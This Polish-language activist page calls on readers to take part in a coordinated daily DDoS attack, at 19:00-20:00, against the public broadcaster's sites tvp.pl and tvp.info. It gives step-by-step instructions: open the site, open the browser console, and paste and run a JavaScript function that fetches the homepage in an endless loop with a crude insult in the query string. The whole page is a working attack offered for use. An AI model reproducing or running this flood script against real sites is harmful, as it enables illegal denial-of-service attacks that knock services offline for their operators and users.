
Po ostatniej aktualizacji reżimu odczuwamy bezsilną wściekłość. Chciałoby się coś z tym zrobić, ale wyjście na ulice nie wchodzi dzisiaj w grę. Niniejszy pomysł jest śmiesznie skromnym wyrazem tej bezsilności, ale daje właśnie to -- pozwala _jakoś_ zareagować: 

### Spróbujmy sprawić, by choć na chwilę zamilkła reżimowa gadzinówka. 

---

Opisane niżej działanie, wykonane w tym samym czasie przez wystarczająco dużo ludzi, doprowadzi do zgaszenia internetowych serwisów reżimowej gadzinówki. Taki nasz mały, obywatelski [DDoS](https://pl.wikipedia.org/wiki/DDoS). Aby nie komplikować sobie życia sprawami organizacyjnymi, umówiliśmy się na działanie codziennie w godzinach 19:00 - 20:00.  

---

### Krok 1

W zakładce otwórz stronę reżimowej gadzinówki:
* https://www.tvp.pl
* https://tvp.info

Możesz otworzyć obie, dla każdej z nich należy wówczas powtórzyć kroki 2-4. 

### Krok 2

Nie opuszczając widoku zakładki, otwórz konsolę przeglądarki: 

[Firefox](https://developer.mozilla.org/en-US/docs/Tools/Web_Console/Keyboard_shortcuts):  
* Windows/Linux: `Control` + `Shift` + `K`
* Mac: `Command` + `Option` + `K`

[Chrome](https://developers.google.com/web/tools/chrome-devtools/shortcuts):
* Windows/Linux: `Control` + `Shift` + `J`
* Mac: `Command` + `Option` + `J`

### Krok 3

> **WAŻNE**: Niewysłowiona złość nie pozbawia nas dobrych manier, zaczynamy więc od ostrzeżenia, że wklejanie nieznanego kodu do konsoli Twojej przeglądarki jest, co do zasady, **bardzo złym pomysłem**. Możesz w ten sposób narazić się na kradzież danych osobowych, haseł, numeru karty kredytowej itp. Poniższa funkcja niczego takiego nie robi, ale jeśli jej nie rozumiesz i znasz kogoś, kto może to dla Ciebie sprawdzić -- zrób to dla higieny ducha i intelektu. Możesz też przeczytać o niej więcej np. [tutaj](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest).  

A teraz -- zaczynamy. Wklej do konsoli poniższy fragment kodu: 

```js
function ssij(msg, i){
    i = i == null ? 0 : i; 
    msg = msg == null ? '8======D' : msg;
    var req = new XMLHttpRequest();
    req.addEventListener('load', () => ssij(msg, i+1));
    req.open('GET', document.location.origin + '/?' + msg + '-' + i);
    req.send();
}
```

Zdefiniuje on program, który będzie nieprzerwanie pobierać zawartość strony głównej aż do momentu zamknięcia zakładki. 

### Krok 4

Uruchom program. Możesz w tym miejscu wysłać reżimowej gadzinówce osobistą wiadomość, np.: 

```js
ssij('a wy gady, ja wam dam')
```

Jeśli wzburzenie odebrało Ci mowę, możesz równie dobrze nie wpisywać niczego: 

```
ssij()
```

reżimowa gadzinówka otrzyma wówczas od Ciebie zwykłego **wała**: `8======D`

---
